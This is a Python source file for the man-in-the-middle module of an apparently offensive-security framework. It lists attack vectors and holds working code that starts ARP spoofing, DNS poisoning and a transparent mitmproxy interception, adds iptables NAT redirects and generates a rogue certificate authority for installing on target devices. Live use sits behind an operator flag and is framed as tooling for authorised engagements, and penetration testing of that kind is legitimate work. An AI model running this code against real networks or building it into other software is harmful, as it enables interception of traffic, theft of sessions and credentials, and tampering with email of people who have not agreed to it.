from __future__ import annotations

import asyncio
import json
import os
import shlex
import tempfile
from pathlib import Path
from typing import Any, Dict, List, Optional

from onikiri.module_base import BaseModule, SupervisorContext
from onikiri.rules.engine import RuleEngine
from onikiri.rules.schema import ACTION_LABELS, ACTION_TYPES, CONDITION_LABELS, CONDITION_TYPES, OPERATOR_LABELS, OPERATORS
from onikiri.rules.store import RuleStore


# ---------------------------------------------------------------------------
# Attack vector definitions
# ---------------------------------------------------------------------------

ATTACK_VECTORS: Dict[str, Dict[str, Any]] = {
    "arp_spoof": {
        "label": "ARP SPOOF",
        "tools": ["arpspoof"],
        "params": ["interface", "gateway_ip", "target_ip"],
        "description": "Poison ARP cache to intercept traffic between target and gateway.",
    },
    "ssl_strip": {
        "label": "SSL/TLS STRIP",
        "tools": ["sslstrip", "iptables"],
        "params": ["interface", "listen_port"],
        "description": "Downgrade HTTPS connections to HTTP to expose plaintext traffic.",
    },
    "dns_poison": {
        "label": "DNS POISON",
        "tools": ["dnschef"],
        "params": ["interface", "nameserver", "records"],
        "description": "Respond to DNS queries with forged records to redirect traffic.",
    },
    "evil_twin": {
        "label": "EVIL TWIN",
        "tools": ["hostapd", "dnsmasq"],
        "params": ["interface", "ssid", "channel", "passphrase"],
        "description": "Create a rogue AP cloning a legitimate SSID to capture Wi-Fi clients.",
    },
    "http_proxy": {
        "label": "HTTP(S) PROXY",
        "tools": ["mitmproxy"],
        "params": ["interface", "listen_port", "ssl_port"],
        "description": "Transparent proxy that applies the rule engine to HTTP(S) traffic.",
    },
    "session_hijack": {
        "label": "SESSION HIJACK",
        "tools": ["mitmproxy"],
        "params": [],
        "description": "Extract session cookies from intercepted traffic.",
    },
    "mitb": {
        "label": "MAN-IN-THE-BROWSER",
        "tools": ["mitmproxy"],
        "params": ["js_payload"],
        "description": "Inject JavaScript into HTML responses to manipulate browser context.",
    },
    "email_hijack": {
        "label": "EMAIL HIJACK",
        "tools": ["mitmproxy"],
        "params": ["smtp_port", "imap_port"],
        "description": "Proxy SMTP/IMAP sessions to capture or modify email in transit.",
    },
    "replay": {
        "label": "REPLAY",
        "tools": ["mitmproxy"],
        "params": ["target_url", "request_file"],
        "description": "Re-send captured HTTP requests to exploit session or CSRF tokens.",
    },
    "fake_ca": {
        "label": "FAKE CA",
        "tools": ["openssl"],
        "params": ["ca_name", "ca_dir"],
        "description": "Generate a rogue certificate authority for SSL interception.",
    },
}


class MitmModule(BaseModule):
    name = "mitm"
    label = "MITM"
    default_action = "status"
    status_hint = "inactive"

    def __init__(self) -> None:
        self._store: Optional[RuleStore] = None
        self._proxy_proc: Optional[asyncio.subprocess.Process] = None
        self._arp_proc: Optional[asyncio.subprocess.Process] = None
        self._dns_proc: Optional[asyncio.subprocess.Process] = None
        self._running = False
        self._active_params: Dict[str, Any] = {}

    # ------------------------------------------------------------------
    # Module metadata
    # ------------------------------------------------------------------

    def actions(self) -> tuple[str, ...]:
        return (
            "status",
            "plan",
            "list_rules",
            "add_rule",
            "remove_rule",
            "toggle_rule",
            "reorder_rules",
            "move_rule_up",
            "move_rule_down",
            "test_rule",
            "start",
            "stop",
            "generate_ca",
            "list_vectors",
        )

    # ------------------------------------------------------------------
    # Rule store accessor
    # ------------------------------------------------------------------

    def _get_store(self, context: SupervisorContext) -> RuleStore:
        if self._store is None:
            path = Path(
                context.config.get(
                    "mitm_rules_path", "/data/engagements/mitm-rules.json"
                )
            )
            self._store = RuleStore(path)
        return self._store

    # ------------------------------------------------------------------
    # Status
    # ------------------------------------------------------------------

    def action_status(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        tools = self.tool_status(
            "mitmproxy", "mitmdump", "arpspoof", "dnschef",
            "sslstrip", "hostapd", "dnsmasq", "openssl", "iptables",
        )
        store = self._get_store(context)
        return {
            "status": "active" if self._running else "inactive",
            "module": self.name,
            "running": self._running,
            "active_params": self._active_params,
            "tools": tools,
            "rule_count": len(store.all()),
        }

    # ------------------------------------------------------------------
    # Planning manifest
    # ------------------------------------------------------------------

    def action_plan(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        store = self._get_store(context)
        rules = store.all()
        return self.safe_manifest(
            "mitm-plan",
            {
                "vector": params.get("vector", "arp_spoof"),
                "interface": params.get("interface", "eth0"),
                "gateway_ip": params.get("gateway_ip", ""),
                "target_ip": params.get("target_ip", ""),
                "rules": rules,
                "rule_count": len(rules),
            },
            "Operator manifest for an authorised engagement. Live operations are disabled in the public profile.",
        )

    # ------------------------------------------------------------------
    # Rule management
    # ------------------------------------------------------------------

    def action_list_rules(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        store = self._get_store(context)
        return {
            "status": "ok",
            "module": self.name,
            "rules": store.all(),
            "schema": {
                "condition_types": list(CONDITION_TYPES),
                "condition_labels": CONDITION_LABELS,
                "operators": list(OPERATORS),
                "operator_labels": OPERATOR_LABELS,
                "action_types": list(ACTION_TYPES),
                "action_labels": ACTION_LABELS,
            },
        }

    def action_add_rule(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        store = self._get_store(context)
        rule_data = params.get("rule", params)
        try:
            added = store.add(rule_data)
            return {"status": "ok", "module": self.name, "rule": added, "rules": store.all()}
        except ValueError as exc:
            return {"status": "error", "module": self.name, "error": str(exc)}

    def action_remove_rule(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        store = self._get_store(context)
        rule_id = params.get("rule_id", params.get("id", ""))
        removed = store.remove(rule_id)
        return {
            "status": "ok" if removed else "not_found",
            "module": self.name,
            "rule_id": rule_id,
            "rules": store.all(),
        }

    def action_toggle_rule(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        store = self._get_store(context)
        rule_id = params.get("rule_id", params.get("id", ""))
        new_state = store.toggle(rule_id)
        if new_state is None:
            return {"status": "not_found", "module": self.name, "rule_id": rule_id}
        return {
            "status": "ok",
            "module": self.name,
            "rule_id": rule_id,
            "enabled": new_state,
            "rules": store.all(),
        }

    def action_reorder_rules(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        store = self._get_store(context)
        ordered_ids: List[str] = params.get("ordered_ids", params.get("ids", []))
        rules = store.reorder(ordered_ids)
        return {"status": "ok", "module": self.name, "rules": rules}

    def action_move_rule_up(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        store = self._get_store(context)
        rule_id = params.get("rule_id", params.get("id", ""))
        rules = store.move_up(rule_id)
        return {"status": "ok", "module": self.name, "rules": rules}

    def action_move_rule_down(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        store = self._get_store(context)
        rule_id = params.get("rule_id", params.get("id", ""))
        rules = store.move_down(rule_id)
        return {"status": "ok", "module": self.name, "rules": rules}

    def action_test_rule(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        rule = params.get("rule", {})
        sample_ctx = params.get("context", {
            "url": "http://example.com/page",
            "domain": "example.com",
            "content_type": "text/html",
            "body": "<html><body>Hello</body></html>",
            "headers": {},
        })
        engine = RuleEngine([rule])
        result = engine.test_rule(rule, sample_ctx)
        return {"status": "ok", "module": self.name, **result}

    # ------------------------------------------------------------------
    # Vector listing
    # ------------------------------------------------------------------

    def action_list_vectors(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        tool_names: List[str] = []
        for v in ATTACK_VECTORS.values():
            tool_names.extend(v["tools"])
        availability = self.tool_status(*set(tool_names))
        vectors = []
        for key, spec in ATTACK_VECTORS.items():
            available = all(availability.get(t, False) for t in spec["tools"])
            vectors.append({
                "id": key,
                "label": spec["label"],
                "tools": spec["tools"],
                "params": spec["params"],
                "description": spec["description"],
                "available": available,
            })
        return {"status": "ok", "module": self.name, "vectors": vectors}

    # ------------------------------------------------------------------
    # MITM start / stop
    # ------------------------------------------------------------------

    async def action_start(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        if self._running:
            return {"status": "already_running", "module": self.name}

        if not context.allow_live_operations:
            return self.safe_manifest(
                "mitm-start",
                params,
                "Live operations are disabled. Set allow_live_operations=true in the operator profile to enable.",
            )

        store = self._get_store(context)
        rules_path = store._path
        rules_path.parent.mkdir(parents=True, exist_ok=True)
        # Ensure rules are on disk
        if not rules_path.exists():
            store._persist()

        addon_path = Path(__file__).resolve().parent.parent / "rules" / "proxy_addon.py"
        vector = params.get("vector", "http_proxy")
        interface = params.get("interface", "eth0")
        listen_port = int(params.get("listen_port", 8080))
        ssl_port = int(params.get("ssl_port", 8443))
        gateway_ip = params.get("gateway_ip", "")
        target_ip = params.get("target_ip", "")

        errors: List[str] = []

        # IP forwarding
        try:
            await self._run_cmd(["sysctl", "-w", "net.ipv4.ip_forward=1"])
        except Exception as exc:
            errors.append(f"ip_forward: {exc}")

        # ARP spoofing
        if vector in ("arp_spoof", "http_proxy") and gateway_ip and target_ip:
            if self.tool_status("arpspoof").get("arpspoof"):
                try:
                    self._arp_proc = await asyncio.create_subprocess_exec(
                        "arpspoof", "-i", interface, "-t", target_ip, gateway_ip,
                        stdout=asyncio.subprocess.DEVNULL,
                        stderr=asyncio.subprocess.DEVNULL,
                    )
                except Exception as exc:
                    errors.append(f"arpspoof: {exc}")

        # DNS spoofing
        if vector == "dns_poison":
            dns_records = params.get("records", {})
            nameserver = params.get("nameserver", "8.8.8.8")
            if self.tool_status("dnschef").get("dnschef"):
                dns_args = ["dnschef", "--interface", interface, "--nameserver", nameserver]
                for domain, ip in dns_records.items():
                    dns_args += [f"--fakeip={domain}={ip}"]
                try:
                    self._dns_proc = await asyncio.create_subprocess_exec(
                        *dns_args,
                        stdout=asyncio.subprocess.DEVNULL,
                        stderr=asyncio.subprocess.DEVNULL,
                    )
                except Exception as exc:
                    errors.append(f"dnschef: {exc}")

        # Evil twin
        if vector == "evil_twin":
            errors.append("Evil twin requires hostapd configuration; use the plan action to generate the config.")

        # HTTP(S) proxy via mitmproxy
        if self.tool_status("mitmdump").get("mitmdump"):
            env = {**os.environ, "ONIKIRI_RULES_PATH": str(rules_path)}
            try:
                self._proxy_proc = await asyncio.create_subprocess_exec(
                    "mitmdump",
                    "--mode", "transparent",
                    "--listen-host", interface,
                    "--listen-port", str(listen_port),
                    "--ssl-insecure",
                    "--scripts", str(addon_path),
                    env=env,
                    stdout=asyncio.subprocess.DEVNULL,
                    stderr=asyncio.subprocess.DEVNULL,
                )
                # iptables redirect
                await self._run_cmd([
                    "iptables", "-t", "nat", "-A", "PREROUTING",
                    "-i", interface, "-p", "tcp", "--dport", "80",
                    "-j", "REDIRECT", "--to-port", str(listen_port),
                ])
                await self._run_cmd([
                    "iptables", "-t", "nat", "-A", "PREROUTING",
                    "-i", interface, "-p", "tcp", "--dport", "443",
                    "-j", "REDIRECT", "--to-port", str(ssl_port),
                ])
            except Exception as exc:
                errors.append(f"mitmproxy: {exc}")

        self._running = True
        self._active_params = dict(params)
        return {
            "status": "active",
            "module": self.name,
            "vector": vector,
            "interface": interface,
            "listen_port": listen_port,
            "errors": errors,
        }

    async def action_stop(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        if not self._running and not context.allow_live_operations:
            return {"status": "inactive", "module": self.name}

        for proc_attr in ("_proxy_proc", "_arp_proc", "_dns_proc"):
            proc: Optional[asyncio.subprocess.Process] = getattr(self, proc_attr)
            if proc is not None:
                try:
                    proc.terminate()
                    await asyncio.wait_for(proc.wait(), timeout=5)
                except Exception:
                    try:
                        proc.kill()
                    except Exception:
                        pass
                setattr(self, proc_attr, None)

        # Remove iptables redirect rules if they were set
        iface = self._active_params.get("interface", "eth0")
        listen_port = int(self._active_params.get("listen_port", 8080))
        ssl_port = int(self._active_params.get("ssl_port", 8443))
        for port_pair in ((80, listen_port), (443, ssl_port)):
            try:
                await self._run_cmd([
                    "iptables", "-t", "nat", "-D", "PREROUTING",
                    "-i", iface, "-p", "tcp", "--dport", str(port_pair[0]),
                    "-j", "REDIRECT", "--to-port", str(port_pair[1]),
                ])
            except Exception:
                pass

        self._running = False
        self._active_params = {}
        return {"status": "inactive", "module": self.name}

    # ------------------------------------------------------------------
    # Fake CA generation
    # ------------------------------------------------------------------

    async def action_generate_ca(self, params: Dict[str, Any], context: SupervisorContext) -> Dict[str, Any]:
        if not context.allow_live_operations:
            return self.safe_manifest(
                "generate-ca",
                params,
                "CA generation is disabled in the public profile.",
            )

        ca_name = params.get("ca_name", "Onikiri-CA")
        ca_dir = Path(params.get("ca_dir", context.config.get("mitm_ca_dir", "/data/engagements/ca")))
        ca_dir.mkdir(parents=True, exist_ok=True)
        key_path = ca_dir / "ca.key"
        cert_path = ca_dir / "ca.crt"

        if not self.tool_status("openssl").get("openssl"):
            return {"status": "error", "module": self.name, "error": "openssl not found"}

        try:
            await self._run_cmd([
                "openssl", "genrsa", "-out", str(key_path), "4096"
            ])
            await self._run_cmd([
                "openssl", "req", "-new", "-x509",
                "-days", "3650",
                "-key", str(key_path),
                "-out", str(cert_path),
                "-subj", f"/CN={ca_name}/O={ca_name}/C=XX",
            ])
        except Exception as exc:
            return {"status": "error", "module": self.name, "error": str(exc)}

        return {
            "status": "ok",
            "module": self.name,
            "ca_name": ca_name,
            "key": str(key_path),
            "cert": str(cert_path),
            "note": "Install ca.crt in target device's trusted certificate store to enable transparent SSL interception.",
        }

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    async def _run_cmd(self, cmd: List[str]) -> None:
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.DEVNULL,
            stderr=asyncio.subprocess.DEVNULL,
        )
        await asyncio.wait_for(proc.wait(), timeout=15)
